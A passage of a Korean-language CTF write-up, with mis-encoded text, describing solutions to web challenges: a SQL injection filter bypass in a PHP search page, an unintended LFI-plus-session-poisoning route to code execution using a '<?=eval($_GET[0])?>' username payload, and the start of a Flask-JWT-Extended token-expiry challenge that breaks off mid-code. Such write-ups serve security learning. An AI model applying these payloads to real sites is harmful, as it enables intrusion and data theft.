</p><h3 id="c7b2f78a-6c84-4b79-bda5-330761187836" class="">5. sql injection â†’ passcode í™•ì¸</h3><figure id="18684d4d-b130-41d1-ac39-086fb200853c" class="image"><a href="/assets/2020-09-01/bob/bob932.png"><img style="width:1920px" src="/assets/2020-09-01/bob/bob932.png"/></a></figure><ul id="6b3a6e29-8ff6-4bef-9894-d6abd360ef27" class="bulleted-list"><li><code>articles.php</code> í˜ì´ì§€ì˜ ìƒë‹¨ì„ ë³´ë©´ ê²€ìƒ‰ ë°•ìŠ¤ê°€ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="abd70b50-81d5-4b5f-bb6f-007a73910059" class="code"><code>&lt;!-- ... --&gt;

&lt;?php
		  $s = $_GET[&quot;search&quot;];
		  $search = &quot;%${s}%&quot;;
		  
		  $page = $_GET[&quot;p&quot;];
		  if(!isset($page) || $page == &quot;&quot; || !is_numeric($page)){
		      $page = 1;
		  }
		  else{
		      $page = intval($page);
		  }
		  $page -= 1;
		  if($page &lt; 0) $page = 0;
		  $start = $page*10;
		  
		  if(preg_match(&quot;/(\ |\n|\t|\r|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text\&quot;)/i&quot;, $search) === 1){
		      echo &quot;&lt;script&gt;alert(&#x27;Don\&#x27;t hack!&#x27;);history.back();&lt;/script&gt;&quot;;
		      die();
		  }
		  $query = &quot;select id, title, content, author, img from board where title like &#x27;${search}&#x27; or content like &#x27;${search}&#x27; order by id desc limit ${start}, 10&quot;;
		  $result = mysqli_query($sql, $query);
		
			while ($row = mysqli_fetch_array($result)){
					echo &quot;&lt;li onclick=\&quot;location.href=&#x27;/?page=view&amp;id=${row[&#x27;id&#x27;]}&#x27;;\&quot;&gt;&quot;;
					echo &quot;&lt;img src=\&quot;${row[&#x27;img&#x27;]}\&quot; style=\&quot;width: 100%; height: 20vh; object-fit: cover; \&quot;&gt;&quot;;
					echo &#x27;&lt;div class=&quot;post-info&quot;&gt;&#x27;;
					echo &#x27;&lt;div class=&quot;post-basic-info&quot;&gt;&#x27;;
					echo &quot;&lt;h3&gt;&lt;a href=\&quot;#\&quot;&gt;${row[&#x27;title&#x27;]}&lt;/a&gt;&lt;/h3&gt;&quot;;
			              echo &quot;&lt;p&gt;${row[&#x27;content&#x27;]}&lt;/p&gt;&quot;;
			              echo &quot;&lt;span&gt;&lt;a href=\&quot;#\&quot;&gt;Writer: ${row[&#x27;author&#x27;]}&lt;/a&gt;&lt;/span&gt;&quot;;
					echo &#x27;&lt;/div&gt;&#x27;;
					echo &#x27;&lt;/div&gt;&#x27;;
					echo &#x27;&lt;/li&gt;&#x27;;
		  }
?&gt;

&lt;!-- ... --&gt;</code></pre><ul id="6f25076f-395c-4480-9704-44f803bf79fa" class="bulleted-list"><li><code>articles.php</code> ì˜ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë©´ ê²€ìƒ‰ êµ¬ë¬¸ì—ì„œ <code>sql injection</code> ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.</li></ul><ul id="540cf34b-c985-405b-aef2-43bac66a039b" class="bulleted-list"><li>í•˜ì§€ë§Œ ìƒë‹¨ì˜ ì •ê·œí‘œí˜„ì‹ì—ì„œ ì–´ëŠ ì •ë„ì˜ ê³µë°±ê³¼ <code>=</code>, <code>like</code> ë“±ì„ í•„í„°ë§ í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ì´ë¥¼ ì ì ˆíˆ ìš°íšŒí•˜ì—¬ í•„ìš”í•œ ì •ë³´ë¥¼ ì–»ì–´ë‚´ì•¼ í•œë‹¤.</li></ul><figure id="e3712a3c-c387-4de2-91c0-cd225d6965be" class="image"><a href="/assets/2020-09-01/bob/bob933.png"><img style="width:1345px" src="/assets/2020-09-01/bob/bob933.png"/></a></figure><ul id="794abae8-2f06-41d2-8d1b-4569ff1a769f" class="bulleted-list"><li>ê³µë°±ì´ í•„í„°ë§ ë˜ì—ˆìœ¼ë‹ˆ <code>\x0b</code> ë˜ëŠ” <code>/**/</code> ë“±ì˜ ì£¼ì„ì„ ì´ìš©í•˜ì—¬ ê³µë°±ì„ ëŒ€ì²´í•˜ê³ , <code>like</code> ì™€ <code>=</code> ê°€ í•„í„°ë§ ë˜ì—ˆìœ¼ë‹ˆ <code>in</code> ì„ ì‚¬ìš©í•˜ì—¬ ë¹„êµë¥¼ í•´ì£¼ì.</li></ul><ul id="9565aa9d-d678-4afc-ac01-74a0d0584659" class="bulleted-list"><li><code>sql injection</code>ì„ í†µí•´ í•´ë‹¹ ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì˜ í…Œì´ë¸” ë¦¬ìŠ¤íŠ¸ë¥¼ ì¶”ì¶œí•˜ì˜€ìœ¼ë©°, ê·¸ ì¤‘ <code>p4SSc0D3</code> í…Œì´ë¸”ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="371a066e-c804-45e9-a69d-7e7136f05a4c" class="image"><a href="/assets/2020-09-01/bob/bob934.png"><img style="width:916px" src="/assets/2020-09-01/bob/bob934.png"/></a></figure><ul id="0a09abfd-5c9b-46a7-9a32-8488f68f4d45" class="bulleted-list"><li><code>p4SSc0D3</code> í…Œì´ë¸”ì˜ ì»¬ëŸ¼ëª…ì€ <code>passcode</code>ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="e35d3660-de52-4364-8236-a59e872596ed" class="image"><a href="/assets/2020-09-01/bob/bob935.png"><img style="width:922px" src="/assets/2020-09-01/bob/bob935.png"/></a></figure><p id="f2c2f12d-75ad-4a30-94dd-e68d600fe886" class="">
</p><h3 id="3e59e4fc-f4b2-4016-907c-0fc3468d9aa4" class="">6. flag í™•ì¸</h3><ul id="025cd1cb-3383-40da-8934-a5c5ff516c0d" class="bulleted-list"><li><code>passcode</code>ëŠ” <code>5UP3R_S3CUR3_STR0NG_P4S5C0D3</code> ì¸ ê²ƒì„ í™•ì¸í–ˆìœ¼ë‹ˆ, ì´ì „ì— í™•ì¸í•œ ì›¹ ì„œë¹„ìŠ¤(ê°œ)ì— <code>passcode</code>ë¥¼ ì…ë ¥í•˜ë©´ <code>flag</code>ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.</li></ul><figure id="f7dfd2d8-33f6-4ca5-9203-a162394c3227" class="image"><a href="/assets/2020-09-01/bob/bob936.png"><img style="width:612px" src="/assets/2020-09-01/bob/bob936.png"/></a></figure><ul id="dd209891-1a9d-40e2-8e8e-5d2f3d232189" class="bulleted-list"><li>FLAG : <mark class="highlight-yellow_background">bob{sabeon_eun_gaein_juiya}</mark></li></ul><p id="090ace04-9aaf-4ccd-ad40-35288608014d" class="">
</p><h3 id="4e1be258-e110-427e-b6a8-6493991f5316" class="">7. ì—¬ë‹´ (1)</h3><figure id="ce3315a4-2ee8-4f20-af11-9cb6299410f8" class="image"><a href="/assets/2020-09-01/bob/bob937.png"><img style="width:1347px" src="/assets/2020-09-01/bob/bob937.png"/></a></figure><ul id="fd3edfdf-02f8-4256-b3ed-99bf43f6e4ec" class="bulleted-list"><li><code>sql injection</code>ì„ í†µí•´ <code>admin</code> í…Œì´ë¸”ê³¼ <code>clue</code> í…Œì´ë¸”ì´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="3e93bd76-86da-48fc-8856-41e2097f46ce" class="code"><code>// ...

if(preg_match(&quot;/(\ |\n|\t|\r|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text\&quot;)/i&quot;, $search) === 1){
    echo &quot;&lt;script&gt;alert(&#x27;Don\&#x27;t hack!&#x27;);history.back();&lt;/script&gt;&quot;;
    die();
}

// ...</code></pre><ul id="75de8847-342c-4759-86fd-a1b318b12d3d" class="bulleted-list"><li>í•˜ì§€ë§Œ ëŒ€íšŒ ì„œë¹„ìŠ¤ ì¤‘ <code>articles.php</code> ì˜ í•„í„°ë§ìœ¼ë¡œ ì¸í•´ <code>clue</code> ì™€ <code>admin</code> ëª¨ë‘ ì ‘ê·¼ì´ ë¶ˆê°€ëŠ¥í•œ ìƒíƒœì˜€ë‹¤.</li></ul><ul id="694fac54-2599-4632-902e-18e00b863a58" class="bulleted-list"><li><code>admin</code> í…Œì´ë¸”ì€ <code>admin ê³„ì •</code> ì˜ í‰ë¬¸ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì €ì¥í•´ë‘ì—ˆë‹¤.</li></ul><pre id="1bae7f9e-30be-4921-8382-e3bfb2467c34" class="code"><code>&lt;!-- ... --&gt;

&lt;?php
    if($_SESSION[&quot;username&quot;]){
        if($_SESSION[&quot;username&quot;] === &quot;admin&quot;){
            echo &quot;&lt;li&gt;&lt;a href=\&quot;/?page=readme\&quot;&gt;&lt;span&gt;Readme&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&quot;;
        }
        echo &quot;&lt;li style=\&quot;position: absolute; left: 10rem;\&quot;&gt;&lt;a href=\&quot;#\&quot; style=\&quot;cursor: default;\&quot;&gt;&lt;span&gt;USER : ${_SESSION[&#x27;username&#x27;]}&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&quot;;
        echo &#x27;&lt;li style=&quot;position: absolute; right: 10rem;&quot;&gt;&lt;a href=&quot;/?page=mypage&quot;&gt;&lt;span&gt;Mypage&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;;
        echo &#x27;&lt;li style=&quot;position: absolute; right: 3rem;&quot;&gt;&lt;a href=&quot;/?page=logout&quot;&gt;&lt;span&gt;Logout&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;;
    }
    else{
        echo &#x27;&lt;li style=&quot;position: absolute; right: 3rem;&quot;&gt;&lt;a href=&quot;/?page=login&quot;&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;;
    }
?&gt;

&lt;!-- ... --&gt;</code></pre><ul id="bc172a0b-6ae4-41bc-ab24-01f30ebe76e7" class="bulleted-list"><li>ê·¸ë¦¬ê³  <code>admin ê³„ì •</code> ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ë©´ <code>readme.php</code> í˜ì´ì§€ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ë©”ë‰´ê°€ ìƒê¸´ë‹¤.</li></ul><pre id="7b2f0159-2060-489c-a312-80909fcb5ddf" class="code"><code>&lt;!-- ... --&gt;

&lt;?php
    if($_SESSION[&quot;username&quot;] !== &quot;admin&quot;){
        echo &#x27;&lt;script&gt;alert(&quot;Invalid access.&quot;);history.back();&lt;/script&gt;&#x27;;
        die();
    }

    $stmt = $sql-&gt;prepare(&quot;select text from clue where 1 limit 1&quot;);
    $stmt-&gt;execute();

    $result = $stmt-&gt;get_result();
    $row = $result-&gt;fetch_assoc();
    
    $data = file_get_contents($row[&quot;text&quot;]);

    
    echo $data;
?&gt;

&lt;!-- ... --&gt;</code></pre><ul id="5cf5c633-3222-4204-9170-49ae82a32846" class="bulleted-list"><li><code>readme.php</code> í˜ì´ì§€ëŠ” <code>clue</code> í…Œì´ë¸”ì— ì¡´ì¬í•˜ëŠ” íŒíŠ¸ ë©”ì‹œì§€ë¥¼ ë°›ì•„ì™€ ì¶œë ¥í•´ì£¼ëŠ” ì—­í• ì„ í•œë‹¤.</li></ul><figure id="6f3b2f66-7227-4d38-85f7-8f458e697b15" class="image"><a href="/assets/2020-09-01/bob/bob938.png"><img style="width:1920px" src="/assets/2020-09-01/bob/bob938.png"/></a></figure><ul id="21329b91-bc79-4a1a-a432-28ae7fc7033c" class="bulleted-list"><li>ëŒ€íšŒ ì „ ë‚ , ì ê²°ì— ì½”ë“œ ìˆ˜ì •í•˜ë‹¤ <code>admin</code> ë¬¸ìì—´ì„ í•„í„°ë§ì— ë„£ëŠ” ë°”ëŒì—,, <code>admin ê³„ì •</code> ì˜ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì•Œì•„ë‚´ì§€ ëª»í•˜ê²Œ ë˜ì–´ íŒíŠ¸ í˜ì´ì§€ê°€ ì‚¬ë¼ì§€ê²Œ ë˜ì—ˆë‹¤.</li></ul><ul id="0224515c-f0c7-408b-a88f-7313f0d38a74" class="bulleted-list"><li>ì´ë¥¼ ì¸ì§€í–ˆì„ ë• ì´ë¯¸ solverê°€ ë‚˜ì™”ê¸° ë•Œë¬¸ì— ìˆ˜ì •í•  ìˆ˜ ì—†ì–´ íŒíŠ¸ í˜ì´ì§€ëŠ” ì—†ì—ˆë˜ ê²ƒìœ¼ë¡œ,,, ë˜ì—ˆë‹¤.</li></ul><ul id="12ca9c06-7ddf-497f-89b0-f74feae2b57b" class="bulleted-list"><li>ìœ„ ìŠ¤í¬ë¦°ìƒ·ì´ ì´ì œëŠ” ë“¤ì–´ê°ˆ ìˆ˜ ì—†ì–´ì ¸ë²„ë¦° <code>íŒíŠ¸ í˜ì´ì§€</code> ë‹¤.</li></ul><p id="efb3a3ca-e1d5-4a9e-ba33-7154f8e6c12f" class="">
</p><h3 id="3d37181d-0b86-4f60-8c95-409b110dbc63" class="">8. ì—¬ë‹´ (2) â†’ Unintended Solution</h3><ul id="0a073c3e-a2f9-4dc5-80e3-3de1b8751837" class="bulleted-list"><li><code>ì´ì§„*</code>, <code>ê¹€ê²½*</code> ë‹˜ê»˜ì„œ ìœ„ì— ì„¤ëª…í–ˆë˜ <code>/home/php/.bash_history</code> ì°¸ì¡°ë¥¼ í†µí•œ í’€ì´ê°€ ì•„ë‹Œ <code>rce</code> ë¡œ ë¬¸ì œë¥¼ í’€ì´í•˜ì—¬, ì´ì— ëŒ€í•œ ì„¤ëª…ë„ ì§„í–‰í•˜ê² ë‹¤.</li></ul><ul id="d21028e3-aa5b-41a9-ae6b-06d14d8396df" class="bulleted-list"><li>lfiì™€ sqliì˜ ê³¼ì •ì€ ë™ì¼í•˜ë‹¤.</li></ul><figure id="5801f382-b44e-4a8f-a71f-accd1bfd3734" class="image"><a href="/assets/2020-09-01/bob/bob939.png"><img style="width:1003px" src="/assets/2020-09-01/bob/bob939.png"/></a></figure><ul id="f541eca3-a0cf-4bb3-870d-17c80ace4f1e" class="bulleted-list"><li>í—¤ë” ë©”ë‰´ë¥¼ í™•ì¸í•´ë³´ë©´, ë¡œê·¸ì¸ ì‹œ <code>USER : {USERNAME}</code> ì˜ í˜•íƒœë¡œ ì¶œë ¥ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="3082b693-dcf6-441e-902c-cfa632e140d7" class="code"><code>&lt;!-- ... --&gt;

&lt;?php
    if($_SESSION[&quot;username&quot;]){
        if($_SESSION[&quot;username&quot;] === &quot;admin&quot;){
            echo &quot;&lt;li&gt;&lt;a href=\&quot;/?page=readme\&quot;&gt;&lt;span&gt;Readme&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&quot;;
        }
        echo &quot;&lt;li style=\&quot;position: absolute; left: 10rem;\&quot;&gt;&lt;a href=\&quot;#\&quot; style=\&quot;cursor: default;\&quot;&gt;&lt;span&gt;USER : ${_SESSION[&#x27;username&#x27;]}&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&quot;;
        echo &#x27;&lt;li style=&quot;position: absolute; right: 10rem;&quot;&gt;&lt;a href=&quot;/?page=mypage&quot;&gt;&lt;span&gt;Mypage&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;;
        echo &#x27;&lt;li style=&quot;position: absolute; right: 3rem;&quot;&gt;&lt;a href=&quot;/?page=logout&quot;&gt;&lt;span&gt;Logout&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;;
    }
    else{
        echo &#x27;&lt;li style=&quot;position: absolute; right: 3rem;&quot;&gt;&lt;a href=&quot;/?page=login&quot;&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&#x27;;
    }
?&gt;

&lt;!-- ... --&gt;</code></pre><ul id="96d051b5-a7e6-4177-8bbb-26fcbbaea7c1" class="bulleted-list"><li><code>header.php</code> ë¥¼ í™•ì¸í•´ë³´ë©´ <code>$_SESSION[&#x27;username&#x27;]</code> ìœ¼ë¡œ ì„¸ì…˜ì— ì €ì¥ëœ usernameì„ ê°€ì ¸ì˜¨ë‹¤.</li></ul><ul id="20f2ede4-f910-4d41-b5ba-f9c9d00a9604" class="bulleted-list"><li>usernameì— <code>&lt;?=eval($_GET[0])?&gt;</code> ì™€ ê°™ì€ PHP expression tagë¥¼ ì‚¬ìš©í•˜ì—¬ eval ì½”ë“œë¥¼ ì‚½ì…í•œ í›„ íšŒì›ê°€ì… ë° ë¡œê·¸ì¸í•œë‹¤.</li></ul><ul id="b465e88f-f39c-4c2e-af3a-5d62ea78655e" class="bulleted-list"><li>ì´í›„ ì¼ë°˜ì ìœ¼ë¡œ ì„¸ì…˜ì´ ì €ì¥ë˜ëŠ” ìœ„ì¹˜ì¸ <code>/var/lib/php/session/</code> ë””ë ‰í† ë¦¬ì˜ <code>sess_{PHPSESSID}</code> íŒŒì¼ì„ lfi ì·¨ì•½ì ì„ í†µí•´ includeí•˜ì—¬ <code>rce</code> í•œë‹¤.</li></ul><figure id="cf58b958-c416-4f79-9d04-f0fb8364fd5b" class="image"><a href="/assets/2020-09-01/bob/bob940.png"><img style="width:1918px" src="/assets/2020-09-01/bob/bob940.png"/></a></figure><figure id="ad50bb0a-be78-4acf-ac5e-6f20ffe40e7a" class="image"><a href="/assets/2020-09-01/bob/bob941.png"><img style="width:1116px" src="/assets/2020-09-01/bob/bob941.png"/></a></figure><figure id="ec8d501c-a512-475a-87cc-6457668f0249" class="image"><a href="/assets/2020-09-01/bob/bob942.png"><img style="width:1232px" src="/assets/2020-09-01/bob/bob942.png"/></a></figure><ul id="ce117fe7-d8f3-4730-8a87-6c493a675b1e" class="bulleted-list"><li>ìœ„ì™€ ê°™ì´ <code>rce</code> ë¥¼ ì§„í–‰í•œ í›„, python flask ì†ŒìŠ¤ì½”ë“œê°€ ìˆëŠ” <code>/app</code> ë””ë ‰í† ë¦¬ë¥¼ ì°¾ì•„ í•´ë‹¹ <code>/app/app.py</code> ë¥¼ ì½ì–´ í¬íŠ¸ ë²ˆí˜¸ë¥¼ ì•Œì•„ë‚¸ë‹¤.</li></ul><ul id="d5d373aa-4fa8-4ceb-a87b-f9c4aa541b65" class="bulleted-list"><li>ê·¸ë¦¬ê³  <code>curl ëª…ë ¹ì–´</code> ë˜ëŠ” <code>ssrf ì·¨ì•½ì </code> ì„ ì´ìš©í•˜ì—¬ <code>http://localhost:2026/flag</code> í˜ì´ì§€ì— ì ‘ê·¼í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•œë‹¤.</li></ul><p id="e733c7ed-1211-455d-bfa2-a0a1ae5876e2" class="">
</p><ul id="1d68c81c-1990-44a6-a602-ca9935eb1661" class="bulleted-list"><li>php ê³„ì •ì€ <code>/flag</code> íŒŒì¼ì— ëŒ€í•œ ì½ê¸° ê¶Œí•œì´ ì—†ê¸° ë•Œë¬¸ì— <code>cat /flag</code>  ë˜ëŠ” <code>lfi ì·¨ì•½ì </code> ìœ¼ë¡œëŠ” ì½ì„ ìˆ˜ ì—†ë‹¤.</li></ul><p id="7335d63e-5568-4b80-8dea-649f73a41875" class="">
</p><h2 id="a31b9d7a-2454-4408-9796-7743bdfe01d9" class="">JWT-Extended</h2><hr id="eebf10ba-3457-4714-b260-a4526f45496f"/><figure id="e78a0135-4f17-4084-b6f1-6fc4b265b787" class="image"><a href="/assets/2020-09-01/bob/bob943.png"><img style="width:711px" src="/assets/2020-09-01/bob/bob943.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="b73ab37f-b214-4154-9264-c4a2f1bf8070"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">ì•ˆì „í•˜ì§€ ì•Šì€ Flask-JWT-Extended ëª¨ë“ˆ ì‚¬ìš©</div></figure><ul id="11967519-126b-4132-b629-e34c241c1736" class="bulleted-list"><li>JWT í† í°ì„ ì „ì†¡í•˜ëŠ” ë°©ë²•ì„ ì—¬ëŸ¬ ê°€ì§€ë¡œ ì‹œë„í•´ë³¼ ìˆ˜ ìˆë‹¤.</li></ul><ul id="6235aa2e-8a85-437c-96fc-dfc2e70afe00" class="bulleted-list"><li>ë¬¸ì œì—ì„œ /flagë¡œ ì•„ë¬´ëŸ° ê°’ì„ ë„£ì§€ ì•Šê³  ì ‘ê·¼í•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì€ msgë¥¼ ë°›ì„ ìˆ˜ ìˆë‹¤. ì—¬ê¸°ì„œ cookies or headers ë¼ëŠ” ë¬¸êµ¬ë¥¼ í†µí•´ í† í° ê°’ì„ ì ì ˆíˆ ë„£ì–´ì¤„ ê³³ì„ ì˜ˆìƒí•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="7ce775c1-6844-439a-ab52-57d693493446" class="image"><a href="/assets/2020-09-01/bob/bob944.png"><img style="width:854px" src="/assets/2020-09-01/bob/bob944.png"/></a></figure><ul id="e02d3a07-4716-4c00-8106-49e52c91b73b" class="bulleted-list"><li>Cookieì™€ Headerë¥¼ ë²ˆê°ˆì•„ê°€ë©° ë§Œë£Œë˜ê±°ë‚˜ ë§Œë£Œë˜ì§€ ì•Šì€ ê°’ì„ ì‚½ì…í•œ í›„ ì „ì†¡í•˜ê²Œ ë˜ë©´ í’€ë¦¬ëŠ” ë¬¸ì œë‹¤.</li></ul><h3 id="143272a0-9c5d-4aa5-98c9-49d869d1cc51" class="">ë¬¸ì œ ìƒì„¸ ì„¤ëª…</h3><ul id="7b13971a-3ba4-4420-9a84-3a3f4a17fff9" class="bulleted-list"><li>ì›ë˜ì˜ ë¬¸ì œ ì†ŒìŠ¤ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.</li></ul><pre id="043dd2bd-12d9-4ec6-af52-37374b16444f" class="code"><code>#!/usr/bin/env python3
from flask import (
    Flask,
    request,
    jsonify
)
from flask_jwt_extended import (
    JWTManager,
    jwt_required,
    create_access_token,
    decode_token,
    get_jwt_identity,
)

from jwt.utils      import base64url_decode
from jwt.algorithms import get_default_algorithms

import datetime, time, json
 

def is_expired(token):
    if decode_token(token, allow_expired=True)[&#x27;exp&#x27;] &lt; int(time.time()):
        return True   
    
    return False


def create_app(config=&quot;app.config.Config&quot;):
    # Setup flask
    app = Flask(__name__)

    app.config.from_object(config)

    @app.route(&quot;/&quot;)
    def index():
        return &quot;POST : /login &lt;br&gt;\nGET : /flag&quot;
    
    # Standard login endpoint
    @app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])
    def login():
        try:
            username = request.json.get(&#x27;username&#x27;, None)
            password = request.json.get(&#x27;password&#x27;, None)
        except:
            return jsonify({&quot;msg&quot;:&quot;&quot;&quot;Bad request. Submit your login / pass as {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;}&quot;&quot;&quot;}), 400
    
        if username != &#x27;admin&#x27; or password != &#x27;admin&#x27;:
            return jsonify({&quot;msg&quot;: &quot;Bad username or password&quot;}), 401
    
        access_token = create_access_token( identity=username,
                                            expires_delta=datetime.timedelta(minutes=1))

        ret = {
            &#x27;access_token&#x27;: access_token,
        }
    
        return jsonify(ret), 200
    
    @app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])
    @jwt_required
    def flag():
        try:
            access_token = request.headers.get(&quot;Authorization&quot;).split()[1]
        except:
            return jsonify({&quot;msg&quot;           : &quot;No Token!&quot;})

        current_user = get_jwt_identity()
        
        if current_user == &#x27;admin&#x27; and is_expired(access_token):
            # Here your Flag / It is not Race condition
            return jsonify({&quot;Good For You&quot;  : app.config[&#x27;FLAG&#x27;]})
        else:
            return jsonify({&quot;msg&quot;           :&quot;Not Expired Token!&quot;})
    

    with app.app_context():
        app.config[&#x27;JWT_SECRET_KEY&#x27;]     = app.config[&#x27;SECRET&#x27;]
        app.config[&#x27;JWT_TOKEN_LOCATION&#x27;] = [&#x27;cookies&#x27;, &#x27;headers&#x27;]
        jwtmanager                       = JWTManager(app)

        return app</code></pre><ul id="1141cb91-532d-4809-aba0-01d76fdb10ce" class="bulleted-list"><li>ìœ„ì˜ ë¬¸ì œì—ì„œ ìš”êµ¬í•˜ëŠ” ê²ƒì€ /flag ë¡œ ì ‘ê·¼í•˜ì—¬ <code><strong>@jwt_required</strong></code>ë¥¼ í†µê³¼í•œ í›„, flag í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ì§€ë§Œ, <code><strong>get_jwt_identity()</strong></code> í•¨ìˆ˜ì™€ <code><strong>is_expired()</strong></code> í•¨ìˆ˜ë¥¼ í†µí•´ í˜„ì¬ í† í°ì´ ë§Œë£Œë˜ì–´ì•¼ë§Œ flagë¥¼ ì „ë‹¬í•´ì£¼ëŠ” í˜•íƒœì˜ ë¬¸ì œì´ë‹¤.</li></ul><ul id="3c22b413-14e9-43a2-be31-1e3a1fc900ee" class="bulleted-list"><li>ì²« ë²ˆì§¸ë¡œ jwt_requiredë¼ëŠ” decoratorì—ì„œëŠ” requestì—ì„œ ë°›ì•„ì˜¨ JWTì˜ ìƒíƒœë¥¼ ì²´í¬í•˜ê³ , ì •ìƒì ì¸ í† í°(ë§Œë£Œ ìƒíƒœ, ì‹œê·¸ë‹ˆì²˜ í™•ì¸ ë“±)ì¸ ê°€ë¥¼ í™•ì¸í•œë‹¤. ì¦‰, ì •ìƒì ìœ¼ë¡œ ì„œë²„ì—ì„œ ë°œí–‰í•œ í† í°ì´ì–´ì•¼ í•œë‹¤ëŠ” ì˜ë¯¸ì´ë‹¤.</li></ul><ul id="6a857874-05dd-4ac0-b0b9-e3b96a8b3810" class="bulleted-list"><li>ë‘ ë²ˆì§¸ë¡œ access_tokenì—ì„œ Authorization í—¤ë”ì— ìˆëŠ” í† í°ì„ ë°›ì•„ì™€ í•´ë‹¹ í† í°ì´ ì •ìƒì ì¸ì§€ ì²´í¬í•˜ì—¬ expired ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ë£¨í‹´ì´ ìˆë‹¤. ë‹¨, ì—¬ê¸°ì„œë„ get_jwt_identity() í•¨ìˆ˜ë¡œ í† í°ì„ ê²€ì‚¬í•˜ê¸° ë•Œë¬¸ì— ì„œë²„ì—ì„œ ë°œí–‰í•œ ì •ìƒì ì¸ í† í°ì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤.</li></ul><ul id="f01ce446-00ee-48c0-a07e-5e6c8e6372a1" class="bulleted-list"><li>ë”°ë¼ì„œ ìœ„ì˜ ë¬¸ì œì˜ ì»¨ì…‰ì€ <strong>JWTê°€ ë§Œë£Œë˜ì§€ ì•Šì•˜ì§€ë§Œ, ë§Œë£Œë˜ì–´ì•¼ í’€ë¦¬</strong>ëŠ” ë¬¸ì œë¡œ, ë¡œì§€ì»¬í•œ ì·¨ì•½ì ì„ ì˜ë„í•œ ê²ƒì´ë‹¤. ë¨¼ì € ë¬¸ì œ í’€ì´ì— ì•ì„œ Flask-JWT-Extended ì˜¤í”ˆì†ŒìŠ¤ì— ëŒ€í•œ ì„¤ëª…ì´ í•„ìš”í•  ê²ƒ ê°™ë‹¤.</li></ul><h3 id="38f0c092-7e17-4c9d-b060-89175ea857da" class="">[Flask-JWT-Extended]</h3><ul id="4c880ec3-1cdf-44e7-a1f5-10908e2458d4" class="bulleted-list"><li>Flaskì—ëŠ” ë‹¤ì–‘í•œ Extended ëª¨ë“ˆì´ ìˆëŠ”ë°, ê·¸ ì¤‘ í•˜ë‚˜ë¡œ JWTì— ëŒ€í•œ ëª¨ë“ˆì´ ìˆë‹¤. pyjwtë¥¼ ì‚¬ìš©í•´ë„ ë¬´ë°©í•˜ë‚˜, ë³´ë‹¤ ìœ ì—°í•œ ì½”ë“œ ì‘ì„±ê³¼ ê´€ë¦¬ë¥¼ ìœ„í•´ Flask-JWT-Extendedë¥¼ ì¶”ì²œí•œë‹¤.</li></ul><ul id="5a2bad66-3149-4d19-9d38-a88fb52aac79" class="bulleted-list"><li><strong><a href="https://flask-jwt-extended.readthedocs.io/en/stable/">Document</a></strong>ë¥¼ ì‚´í´ë³´ë©´ Basic Usageì—ì„œ ë³´ì—¬ì£¼ëŠ” ê²ƒê³¼ ê°™ì´ <code><strong>Header</strong></code>ë¥¼ í†µí•´ JWTë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒê³¼ <code><strong>Query(get)</strong></code>, <code><strong>JSON(post)</strong></code>, <code><strong>Cookie</strong></code>ê·¸ë¦¬ê³  ì´ ë„¤ ê°€ì§€ ë°©ë²•ìœ¼ë¡œ ì‚¬ìš©ì´ ê°€ëŠ¥í•˜ë‹¤.</li></ul><ul id="b4b5d55c-5d08-45e7-b993-548a0deb16e2" class="bulleted-list"><li>ì´ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë£¨í‹´ì„ ë¨¼ì € íŒŒì•…í•´ë³´ë„ë¡ í•˜ì.</li></ul><ul id="c404ad61-98f6-4853-8b33-7bdd31e098ca" class="bulleted-list"><li>flask-jwt-extended ì˜ view_decorator ì†ŒìŠ¤</li></ul><pre id="cf45bfc8-a096-4d50-85f9-e1f7ae8450dc" class="code code-wrap"><code># https://github.com/vimalloc/flask-jwt-extended/blob/master/flask_jwt_extended/view_decorators.py
def _decode_jwt_from_request(request_type):
    # All the places we can get a JWT from in this request
    get_encoded_token_functions = []

    locations = config.token_location

    # add the functions in the order specified in JWT_TOKEN_LOCATION
    for location in locations:
